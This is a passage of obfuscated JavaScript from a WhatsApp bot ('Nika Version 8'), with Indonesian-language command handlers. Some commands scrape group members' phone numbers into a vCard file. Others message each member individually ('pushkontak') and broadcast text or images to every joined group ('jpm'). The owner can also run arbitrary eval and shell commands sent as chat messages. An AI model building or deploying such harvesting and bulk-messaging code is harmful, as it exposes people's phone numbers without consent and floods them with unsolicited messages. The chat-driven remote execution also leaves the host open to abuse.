            cmd: _0x3d6dcf.toLowerCase(),
            respon: _0x1101db
          };
          list.push(_0x13765a);
          fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2));
          _0x172af6.reply("Berhasil menambah cmd respon *" + _0x3d6dcf.toLowerCase() + "* kedalam database respon");
        }
        break;
      case "delrespon":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"));
          }
          const _0x209dd5 = _0x3b31a4.toLowerCase();
          let _0x3b57f1 = list.find(_0x1df178 => _0x1df178.cmd == _0x209dd5.toLowerCase());
          if (!_0x3b57f1) {
            return _0x172af6.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon");
          }
          let _0x28b19c = list.indexOf(_0x3b57f1);
          await list.splice(_0x28b19c, 1);
          fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2));
          _0x172af6.reply("Berhasil menghapus cmd respon *" + _0x209dd5.toLowerCase() + "* dari database respon");
        }
        break;
      case "listrespon":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          if (list.length < 1) {
            return _0x172af6.reply("Tidak ada cmd respon");
          }
          let _0x55bacd = "\n *#- List all cmd response*\n";
          await list.forEach(_0x250cfb => _0x55bacd += "\n* *Cmd :* " + _0x250cfb.cmd + "\n");
          _0x172af6.reply("" + _0x55bacd);
        }
        break;
      case "addmurbug":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4 && !_0x172af6.quoted) {
            return _0x3efc1e(_0x22a6b8("6285###"));
          }
          const _0x6c6f74 = _0x172af6.quoted ? _0x172af6.quoted.sender : _0x3b31a4.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0x1f1fd8 = _0x6c6f74.split("@")[0];
          if (_0x1f1fd8 === global.owner || premium.includes(_0x6c6f74) || _0x6c6f74 === _0x4b67d6) {
            return _0x3efc1e("Nomor " + _0x1f1fd8 + " sudah menjadi Murbug!");
          }
          premium.push(_0x6c6f74);
          await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
          _0x3efc1e("Berhasil menambah " + _0x1f1fd8 + " ke Murbug");
        }
        break;
      case "listmurbug":
        {
          if (premium.length < 1) {
            return _0x172af6.reply("Tidak ada user Murbug");
          }
          let _0x40bb94 = "\n *List Murbug Nika*\n";
          for (let _0x1460e4 of premium) {
            _0x40bb94 += "\n* " + _0x1460e4.split("@")[0] + "\n* *Tag :* @" + _0x1460e4.split("@")[0] + "\n";
          }
          _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x40bb94,
            mentions: premium
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "delmurbug":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x172af6.quoted && !_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("6285###"));
          }
          const _0x4d4564 = _0x172af6.quoted ? _0x172af6.quoted.sender : _0x3b31a4.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0x2be2d0 = _0x4d4564.split("@")[0];
          if (_0x2be2d0 == global.owner || _0x4d4564 == _0x4b67d6) {
            return _0x3efc1e("Dia Owner Anjg");
          }
          if (!premium.includes(_0x4d4564)) {
            return _0x3efc1e("Nomor " + _0x2be2d0 + " bukan reseller!");
          }
          let _0xa4d0b0 = premium.indexOf(_0x4d4564);
          await premium.splice(_0xa4d0b0, 1);
          await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
          _0x3efc1e("Berhasil menghapus " + _0x2be2d0 + " Dari Murbug Nika");
        }
        break;
      case "savekontak":
        {
          if (!isOwner) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("idgrupnya"));
          }
          let _0x297ec6 = await _0x4b0487.groupMetadata(_0x3b31a4);
          const _0xd5ae81 = await _0x297ec6.participants.filter(_0x2487fe => _0x2487fe.id.endsWith(".net")).map(_0x187445 => _0x187445.id);
          for (let _0x207661 of _0xd5ae81) {
            if (_0x207661 !== _0x4b67d6 && _0x207661.split("@")[0] !== global.owner) {
              contacts.push(_0x207661);
              fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            }
          }
          try {
            const _0x49d756 = [...new Set(contacts)];
            const _0x560b7b = _0x49d756.map((_0x452e1d, _0x26f06d) => {
              const _0x1dd5c5 = ["BEGIN:VCARD", "VERSION:3.0", "FN:Buyer Depay - " + _0x452e1d.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x452e1d.split("@")[0] + ":+" + _0x452e1d.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x1dd5c5;
            }).join("");
            fs.writeFileSync("./library/database/contacts.vcf", _0x560b7b, "utf8");
          } catch (_0x3863b6) {
            _0x172af6.reply(_0x3863b6.toString());
          } finally {
            if (_0x172af6.chat !== _0x172af6.sender) {
              await _0x3efc1e("*Berhasil membuat file kontak ✅*\nFile kontak telah dikirim ke private chat\nTotal *" + _0xd5ae81.length + "* kontak");
            }
            await _0x4b0487.sendMessage(_0x172af6.sender, {
              document: fs.readFileSync("./library/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File kontak berhasil dibuat ✅\nTotal *" + _0xd5ae81.length + "* kontak",
              mimetype: "text/vcard"
            }, {
              quoted: _0x172af6
            });
            contacts.splice(0, contacts.length);
            await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            await fs.writeFileSync("./library/database/contacts.vcf", "");
          }
        }
        break;
      case "savekontak2":
        {
          if (!isOwner) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          let _0x239ceb = await _0x172af6.metadata;
          const _0x3afcae = await _0x239ceb.participants.filter(_0x3993df => _0x3993df.id.endsWith(".net")).map(_0x2c77ae => _0x2c77ae.id);
          for (let _0xcb08ae of _0x3afcae) {
            if (_0xcb08ae !== _0x4b67d6 && _0xcb08ae.split("@")[0] !== global.owner) {
              contacts.push(_0xcb08ae);
              fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            }
          }
          try {
            const _0x34e7b3 = [...new Set(contacts)];
            const _0x5371e5 = _0x34e7b3.map((_0x22c477, _0x4d702d) => {
              const _0x568bae = ["BEGIN:VCARD", "VERSION:3.0", "FN:Buyer Depay - " + _0x22c477.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x22c477.split("@")[0] + ":+" + _0x22c477.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x568bae;
            }).join("");
            fs.writeFileSync("./library/database/contacts.vcf", _0x5371e5, "utf8");
          } catch (_0x3cd1ea) {
            _0x172af6.reply(_0x3cd1ea.toString());
          } finally {
            if (_0x172af6.chat !== _0x172af6.sender) {
              await _0x3efc1e("*Berhasil membuat file kontak ✅*\nFile kontak telah dikirim ke private chat\nTotal *" + _0x3afcae.length + "* kontak");
            }
            await _0x4b0487.sendMessage(_0x172af6.sender, {
              document: fs.readFileSync("./library/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File kontak berhasil dibuat ✅\nTotal *" + _0x3afcae.length + "* kontak",
              mimetype: "text/vcard"
            }, {
              quoted: _0x172af6
            });
            contacts.splice(0, contacts.length);
            await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            await fs.writeFileSync("./library/database/contacts.vcf", "");
          }
        }
        break;
      case "pushkontak":
        {
          if (!isOwner) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("pesannya"));
          }
          const _0xb6685 = await _0x4b0487.groupFetchAllParticipating();
          let _0x3601f7 = await Object.keys(_0xb6685);
          global.textpushkontak = _0x3b31a4;
          let _0x1e07d3 = [];
          for (let _0xf635b9 of _0x3601f7) {
            await _0x1e07d3.push({
              title: _0xb6685[_0xf635b9].subject,
              id: ".respushkontak " + _0xf635b9,
              description: _0xb6685[_0xf635b9].participants.length + " Member"
            });
          }
          return _0x4b0487.sendMessage(_0x172af6.chat, {
            buttons: [{
              buttonId: "action",
              buttonText: {
                displayText: "ini pesan interactiveMeta"
              },
              type: 4,
              nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                  title: "Pilih Grup",
                  sections: [{
                    title: "List Grup Chat",
                    rows: [..._0x1e07d3]
                  }]
                })
              }
            }],
            footer: "Nika Version 8",
            headerType: 1,
            viewOnce: true,
            text: "Pilih Target Grup Pushkontak\n",
            contextInfo: {
              isForwarded: true,
              mentionedJid: [_0x172af6.sender, global.owner + "@s.whatsapp.net"]
            }
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "respushkontak":
        {
          if (!isOwner) {
            return;
          }
          if (!_0x3b31a4) {
            return;
          }
          if (!global.textpushkontak) {
            return;
          }
          const _0x466a9b = _0x3b31a4;
          const _0x2669e6 = global.textpushkontak;
          const _0x5993db = _0x172af6.chat;
          const _0x4c53d3 = await _0x4b0487.groupMetadata(_0x466a9b);
          const _0x3b8306 = await _0x4c53d3.participants.filter(_0x4e7edf => _0x4e7edf.id.endsWith(".net")).map(_0x3d2245 => _0x3d2245.id);
          await _0x172af6.reply("Memproses *pushkontak* ke dalam grup *" + _0x4c53d3.subject + "*");
          for (let _0x3a06ae of _0x3b8306) {
            if (_0x3a06ae !== _0x4b67d6 && _0x3a06ae.split("@")[0] !== global.owner) {
              await _0x4b0487.sendMessage(_0x3a06ae, {
                text: _0x2669e6
              }, {
                quoted: _0x573c11
              });
              await sleep(global.delayPushkontak);
            }
          }
          delete global.textpushkontak;
          await _0x4b0487.sendMessage(_0x5993db, {
            text: "*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : " + _0x3b8306.length
          }, {
            quoted: _0x172af6
          });
        }
        break;
      case "pushkontak2":
        {
          if (!isOwner) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x172af6.isGroup) {
            return _0x3efc1e(mess.group);
          }
          if (!_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("pesannya"));
          }
          const _0x26e6f4 = _0x3b31a4;
          const _0x510645 = _0x172af6.chat;
          const _0x38c66c = await _0x4b0487.groupMetadata(_0x172af6.chat);
          const _0x514a88 = await _0x38c66c.participants.filter(_0x123d20 => _0x123d20.id.endsWith(".net")).map(_0x141fcc => _0x141fcc.id);
          await _0x3efc1e("Memproses pushkontak ke *" + _0x514a88.length + "* member grup");
          for (let _0x27d061 of _0x514a88) {
            if (_0x27d061 !== _0x4b67d6 && _0x27d061.split("@")[0] !== global.owner) {
              await _0x4b0487.sendMessage(_0x27d061, {
                text: _0x26e6f4
              }, {
                quoted: _0x573c11
              });
              await sleep(global.delayPushkontak);
            }
          }
          await _0x4b0487.sendMessage(_0x510645, {
            text: "*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : " + _0x514a88.length
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "jpmslide":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          let _0x1dbc1b = await _0x4b0487.groupFetchAllParticipating();
          let _0x101d6f = await Object.keys(_0x1dbc1b);
          let _0x25aa49 = 0;
          const _0x4986b7 = _0x172af6.chat;
          await _0x3efc1e("Memproses *jpmslide* Ke " + _0x101d6f.length + " grup");
          for (let _0x4c3b66 of _0x101d6f) {
            if (global.db.groups[_0x4c3b66] && global.db.groups[_0x4c3b66].blacklistjpm && global.db.groups[_0x4c3b66].blacklistjpm == true) {
              continue;
            }
            try {
              await slideButton(_0x4c3b66);
              _0x25aa49 += 1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await _0x4b0487.sendMessage(_0x4986b7, {
            text: "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x25aa49
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "jpmslidehidetag":
      case "jpmslideht":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          let _0x9c13d8 = await _0x4b0487.groupFetchAllParticipating();
          let _0x1870b4 = await Object.keys(_0x9c13d8);
          let _0x114d2e = 0;
          const _0x3b3077 = _0x172af6.chat;
          await _0x3efc1e("Memproses *jpmslide hidetag* Ke " + _0x1870b4.length + " grup");
          for (let _0x43bd99 of _0x1870b4) {
            if (global.db.groups[_0x43bd99] && global.db.groups[_0x43bd99].blacklistjpm && global.db.groups[_0x43bd99].blacklistjpm == true) {
              continue;
            }
            try {
              await slideButton(_0x43bd99, _0x9c13d8[_0x43bd99].participants.map(_0x4810e6 => _0x4810e6.id));
              _0x114d2e += 1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await _0x4b0487.sendMessage(_0x3b3077, {
            text: "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x114d2e
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "jpm":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!q) {
            return _0x3efc1e(_0x22a6b8("teksnya"));
          }
          let _0x3ba845 = await _0x4b0487.groupFetchAllParticipating();
          let _0x5b38f3 = await Object.keys(_0x3ba845);
          let _0x40b637 = 0;
          const _0x51d277 = _0x172af6.chat;
          const _0x5e63bb = _0x3b31a4;
          await _0x172af6.reply("Memproses *jpm* teks Ke " + _0x5b38f3.length + " grup");
          for (let _0x5393d5 of _0x5b38f3) {
            if (global.db.groups[_0x5393d5] && global.db.groups[_0x5393d5].blacklistjpm && global.db.groups[_0x5393d5].blacklistjpm == true) {
              continue;
            }
            try {
              await _0x4b0487.sendMessage(_0x5393d5, {
                text: "" + _0x5e63bb
              }, {
                quoted: _0x245398
              });
              _0x40b637 += 1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await _0x4b0487.sendMessage(_0x51d277, {
            text: "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x40b637
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "jpm2":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!q) {
            return _0x3efc1e(_0x22a6b8("teks dengan mengirim foto"));
          }
          if (!/image/.test(_0x12a7ce)) {
            return _0x3efc1e(_0x22a6b8("teks dengan mengirim foto"));
          }
          const _0x1dd972 = await _0x4b0487.groupFetchAllParticipating();
          const _0x52926f = await Object.keys(_0x1dd972);
          let _0x3db84a = 0;
          const _0x16806e = _0x3b31a4;
          const _0xaa437e = _0x172af6.chat;
          const _0x1e15e6 = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
          await _0x172af6.reply("Memproses *jpm* teks & foto Ke " + _0x52926f.length + " grup");
          for (let _0x5f2372 of _0x52926f) {
            if (global.db.groups[_0x5f2372] && global.db.groups[_0x5f2372].blacklistjpm && global.db.groups[_0x5f2372].blacklistjpm == true) {
              continue;
            }
            try {
              await _0x4b0487.sendMessage(_0x5f2372, {
                image: fs.readFileSync(_0x1e15e6),
                caption: _0x16806e
              }, {
                quoted: _0x245398
              });
              _0x3db84a += 1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await fs.unlinkSync(_0x1e15e6);
          await _0x4b0487.sendMessage(_0xaa437e, {
            text: "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x3db84a
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "dana":
        {
          if (!_0x23ae7f) {
            return;
          }
          let _0x42b870 = "\n*PAYMENT DANA " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.dana + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x42b870
          }, {
            quoted: _0x4f8f4d
          });
        }
        break;
      case "ovo":
        {
          if (!_0x23ae7f) {
            return;
          }
          let _0x22da0f = "\n*PAYMENT OVO " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.ovo + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x22da0f
          }, {
            quoted: _0x4f8f4d
          });
        }
        break;
      case "gopay":
        {
          if (!_0x23ae7f) {
            return;
          }
          let _0x417589 = "\n*PAYMENT GOPAY " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.gopay + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x417589
          }, {
            quoted: _0x4f8f4d
          });
        }
        break;
      case "shopepay":
        {
          if (!_0x23ae7f) {
            return;
          }
          let _0x533733 = "\n*PAYMENT SHOPEPAY " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.shopepay + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x533733
          }, {
            quoted: _0x4f8f4d
          });
        }
        break;
      case "ambilq":
      case "q":
        {
          if (!_0x172af6.quoted) {
            return;
          }
          let _0x222017 = JSON.stringify(_0x172af6.quoted, null, 2);
          _0x172af6.reply(_0x222017);
        }
        break;
      case "toaudio":
      case "tovn":
        {
          if (!/video|mp4/.test(_0x12a7ce)) {
            return _0x172af6.reply(_0x22a6b8("dengan reply/kirim vidio"));
          }
          const _0x490871 = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
          const _0x45a713 = await toAudio(fs.readFileSync(_0x490871), "mp4");
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            audio: _0x45a713,
            mimetype: "audio/mpeg",
            ptt: /tovn/.test(_0x3d57b5) ? true : false
          }, {
            quoted: _0x172af6
          });
          await fs.unlinkSync(_0x490871);
        }
        break;
      case "proses":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          if (!q) {
            return _0x172af6.reply(_0x22a6b8("jasa install panel"));
          }
          let _0x265375 = "📦 " + _0x3b31a4 + "\n⏰ " + tanggal(Date.now()) + "\n\n*Testimoni :*\n" + linkSaluran + "\n\n*Marketplace :*\n" + linkGrup;
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x265375,
            mentions: [_0x172af6.sender],
            contextInfo: {
              externalAdReply: {
                title: "Dana Masuk ✅",
                body: "© Powered By " + namaOwner,
                thumbnailUrl: global.image.reply,
                sourceUrl: linkSaluran
              }
            }
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "done":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          if (!q) {
            return _0x172af6.reply(_0x22a6b8("jasa install panel"));
          }
          let _0x13c20d = "📦 " + _0x3b31a4 + "\n⏰ " + tanggal(Date.now()) + "\n\n*Testimoni :*\n" + linkSaluran + "\n\n*Marketplace :*\n" + linkGrup;
          await _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x13c20d,
            mentions: [_0x172af6.sender],
            contextInfo: {
              externalAdReply: {
                title: "Transaksi Done ✅",
                body: "© Powered By " + namaOwner,
                thumbnailUrl: global.image.reply,
                sourceUrl: linkSaluran
              }
            }
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "save":
      case "sv":
        {
          if (!_0x23ae7f) {
            return;
          }
          await _0x4b0487.sendContact(_0x172af6.chat, [_0x172af6.chat.split("@")[0]], _0x172af6);
        }
        break;
      case "self":
        {
          if (!_0x23ae7f) {
            return;
          }
          _0x4b0487.public = false;
          _0x3efc1e("Berhasil mengganti ke mode *self*");
        }
        break;
      case "getcase":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("menu"));
          }
          const _0x52fa28 = _0x36695f => {
            const _0x34733f = fs.readFileSync("./depay.js").toString();
            const _0x53496b = new RegExp("case ['\"]" + _0x36695f + "['\"]", "i");
            const _0x9247fa = _0x34733f.split(_0x53496b);
            if (_0x9247fa.length < 2) {
              throw new Error("Case not found");
            }
            return "case " + ("'" + _0x36695f + "'") + _0x9247fa[1].split("break")[0] + "break";
          };
          try {
            reply("" + _0x52fa28(q));
          } catch (_0x3d1993) {
            return _0x172af6.reply("Case *" + _0x3b31a4 + "* Tidak Ditemukan");
          }
        }
        break;
      case "ping":
      case "uptime":
        {
          let _0x38c370 = speed();
          let _0x3f2c97 = speed() - _0x38c370;
          let _0x1c86a1 = await nou.os.oos();
          var _0x2e0d3d = await nou.drive.info();
          let _0x18ec74 = "\n*INFORMATION SERVER*\n\n*• Platform :* " + nou.os.type() + "\n*• Total Ram :* " + formatp(os.totalmem()) + "\n*• Total Disk :* " + _0x2e0d3d.totalGb + " GB\n*• Total Cpu :* " + os.cpus().length + " Core\n*• Runtime Vps :* " + runtime(os.uptime()) + "\n*• Respon Speed :* " + _0x3f2c97.toFixed(4) + " detik\n*• Runtime Bot :* " + runtime(process.uptime()) + "\n";
          await _0x3efc1e(_0x18ec74);
        }
        break;
      case "public":
        {
          if (!_0x23ae7f) {
            return;
          }
          _0x4b0487.public = true;
          _0x3efc1e("Berhasil mengganti ke mode *public*");
        }
        break;
      case "restart":
      case "rst":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          await _0x172af6.reply("Memproses _restart server_ . . .");
          var _0x14479d = await fs.readdirSync("./session");
          var _0x4b3970 = await _0x14479d.filter(_0x52caf3 => _0x52caf3 !== "creds.json");
          for (let _0x2188a9 of _0x4b3970) {
            await fs.unlinkSync("./session/" + _0x2188a9);
          }
          await process.send("reset");
        }
        break;
      case "upchannel":
      case "upch":
        {
          if (!_0x23ae7f) {
            return _0x350195(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("teksnya"));
          }
          await _0x4b0487.sendMessage(idSaluran, {
            text: _0x3b31a4
          });
          _0x3efc1e("Berhasil mengirim pesan *teks* ke dalam channel whatsapp");
        }
        break;
      case "upchannel2":
      case "upch2":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("teksnya dengan mengirim foto"));
          }
          if (!/image/.test(_0x12a7ce)) {
            return _0x172af6.reply(_0x22a6b8("teksnya dengan mengirim foto"));
          }
          let _0x260623 = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
          await _0x4b0487.sendMessage(idSaluran, {
            image: await fs.readFileSync(_0x260623),
            caption: _0x3b31a4
          });
          _0x3efc1e("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp");
          await fs.unlinkSync(_0x260623);
        }
        break;
      case "getsc":
        {
          if (_0x172af6.sender.split("@")[0] !== global.owner && _0x172af6.sender !== _0x4b67d6) {
            return _0x3efc1e(mess.owner);
          }
          let _0x243a48 = await fs.readdirSync("./library/database/sampah");
          if (_0x243a48.length >= 2) {
            let _0x5135bc = _0x243a48.filter(_0x577256 => _0x577256 !== "A");
            for (let _0x4787c7 of _0x5135bc) {
              await fs.unlinkSync("./library/database/sampah/" + _0x4787c7);
            }
          }
          await _0x172af6.reply("Wait.....");
          var _0x33a2ba = "Nika Version 8 By Depay";
          const _0x3383ed = (await execSync("ls")).toString().split("\n").filter(_0x17234 => _0x17234 != "node_modules" && _0x17234 != "session" && _0x17234 != "package-lock.json" && _0x17234 != "yarn.lock" && _0x17234 != "");
          const _0x172ff9 = await execSync("zip -r " + _0x33a2ba + ".zip " + _0x3383ed.join(" "));
          await _0x4b0487.sendMessage(_0x172af6.sender, {
            document: await fs.readFileSync("./" + _0x33a2ba + ".zip"),
            fileName: _0x33a2ba + ".zip",
            mimetype: "application/zip"
          }, {
            quoted: _0x172af6
          });
          await execSync("rm -rf " + _0x33a2ba + ".zip");
          if (_0x172af6.chat !== _0x172af6.sender) {
            return _0x3efc1e("Script bot berhasil dikirim ke private chat");
          }
        }
        break;
      case "resetdb":
      case "rstdb":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          for (let _0x42d8da of Object.keys(global.db)) {
            global.db[_0x42d8da] = {};
          }
          _0x3efc1e("Berhasil mereset database ✅");
        }
        break;
      case "setppbot":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (/image/g.test(_0x12a7ce)) {
            var _0x2a04cb = await _0x4b0487.downloadAndSaveMediaMessage(_0x192152);
            if (_0xd4ebe7[0] && _0xd4ebe7[0] == "panjang") {
              const {
                img: _0x2b2003
              } = await generateProfilePicture(_0x2a04cb);
              await _0x4b0487.query({
                tag: "iq",
                attrs: {
                  to: _0x4b67d6,
                  type: "set",
                  xmlns: "w:profile:picture"
                },
                content: [{
                  tag: "picture",
                  attrs: {
                    type: "image"
                  },
                  content: _0x2b2003
                }]
              });
              await fs.unlinkSync(_0x2a04cb);
              _0x3efc1e("Berhasil mengganti foto profil bot ✅");
            } else {
              await _0x4b0487.updateProfilePicture(_0x4b67d6, {
                content: _0x2a04cb
              });
              await fs.unlinkSync(_0x2a04cb);
              _0x3efc1e("Berhasil mengganti foto profil bot ✅");
            }
          } else {
            return _0x3efc1e(_0x22a6b8("dengan mengirim foto"));
          }
        }
        break;
      case "clearchat":
      case "clc":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          _0x4b0487.chatModify({
            delete: true,
            lastMessages: [{
              key: _0x172af6.key,
              messageTimestamp: _0x172af6.timestamp
            }]
          }, _0x172af6.chat);
        }
        break;
      case "listowner":
      case "listown":
        {
          if (owners.length < 1) {
            return _0x3efc1e("Tidak ada owner tambahan");
          }
          let _0x31385f = "\n *List all owner tambahan*\n";
          for (let _0x20314a of owners) {
            _0x31385f += "\n* " + _0x20314a.split("@")[0] + "\n* *Tag :* @" + _0x20314a.split("@")[0] + "\n";
          }
          _0x4b0487.sendMessage(_0x172af6.chat, {
            text: _0x31385f,
            mentions: owners
          }, {
            quoted: _0x5e0a0c
          });
        }
        break;
      case "delowner":
      case "delown":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x172af6.quoted && !_0x3b31a4) {
            return _0x172af6.reply(_0x22a6b8("6285###"));
          }
          const _0x1a3a32 = _0x172af6.quoted ? _0x172af6.quoted.sender : _0x3b31a4.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0x40adba = _0x1a3a32.split("@")[0];
          if (_0x40adba === global.owner || _0x1a3a32 == _0x4b67d6) {
            return _0x3efc1e("Tidak bisa menghapus owner utama!");
          }
          if (!owners.includes(_0x1a3a32)) {
            return _0x3efc1e("Nomor " + _0x40adba + " bukan owner bot!");
          }
          let _0x34642c = owners.indexOf(_0x1a3a32);
          await owners.splice(_0x34642c, 1);
          await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2));
          _0x3efc1e("Berhasil menghapus owner ✅");
        }
        break;
      case "addowner":
      case "addown":
        {
          if (!_0x23ae7f) {
            return _0x3efc1e(mess.owner);
          }
          if (!_0x172af6.quoted && !_0x3b31a4) {
            return _0x3efc1e(_0x22a6b8("6285###"));
          }
          const _0x17fdfd = _0x172af6.quoted ? _0x172af6.quoted.sender : _0x3b31a4.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0x3b2e6c = _0x17fdfd.split("@")[0];
          if (_0x3b2e6c === global.owner || owners.includes(_0x17fdfd) || _0x17fdfd === _0x4b67d6) {
            return _0x3efc1e("Nomor " + _0x3b2e6c + " sudah menjadi owner bot!");
          }
          owners.push(_0x17fdfd);
          await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2));
          _0x3efc1e("Berhasil menambah owner ✅");
        }
        break;
      default:
        if (_0x22d079.startsWith(">")) {
          if (!_0x23ae7f) {
            return;
          }
          try {
            let _0x4bd4af = await eval(_0x22d079.slice(2));
            if (typeof _0x4bd4af !== "string") {
              _0x4bd4af = require("util").inspect(_0x4bd4af);
            }
            await _0x172af6.reply(_0x4bd4af);
          } catch (_0x12101c) {
            await _0x172af6.reply(String(_0x12101c));
          }
        }
        if (_0x172af6.text.toLowerCase() == "bot") {
          _0x3efc1e("Oi Ape Bos");
        }
        if (_0x172af6.text.toLowerCase() == "woi bot") {
          _0x3efc1e("napa? ");
        }
        if (_0x172af6.text.toLowerCase() == "p") {
          _0x3efc1e("Uy, Owner Lagi Off,ini yang bales Bot Tunggu aja yak,Tar Bakal Cepet On dah");
        }
        if (_0x172af6.text.toLowerCase() == "sayang") {
          _0x3efc1e("Iya ayy >< ");
        }
        if (_0x172af6.text.toLowerCase() == "yang") {
          _0x172af6.reply("iyaa ayy >< ");
        }
        if (_0x22d079.startsWith("=>")) {
          if (!_0x23ae7f) {
            return;
          }
          try {
            let _0x31ab59 = await eval("(async () => { " + _0x22d079.slice(2) + " })()");
            if (typeof _0x31ab59 !== "string") {
              _0x31ab59 = require("util").inspect(_0x31ab59);
            }
            await _0x172af6.reply(_0x31ab59);
          } catch (_0x1fb30c) {
            await _0x172af6.reply(String(_0x1fb30c));
          }
        }
        if (_0x22d079.startsWith("$")) {
          if (!_0x23ae7f) {
            return;
          }
          if (!_0x3b31a4) {
            return;
          }
          exec(_0x22d079.slice(2), (_0xf711e1, _0x12bc5c) => {
            if (_0xf711e1) {
              return _0x172af6.reply("" + _0xf711e1);
            }
            if (_0x12bc5c) {
              return _0x172af6.reply(_0x12bc5c);
            }
          });
        }
    }
  } catch (_0x14f5f9) {
    console.log(util.format(_0x14f5f9));
    let _0x358807 = global.owner;
    _0x4b0487.sendMessage(_0x358807 + "@s.whatsapp.net", {
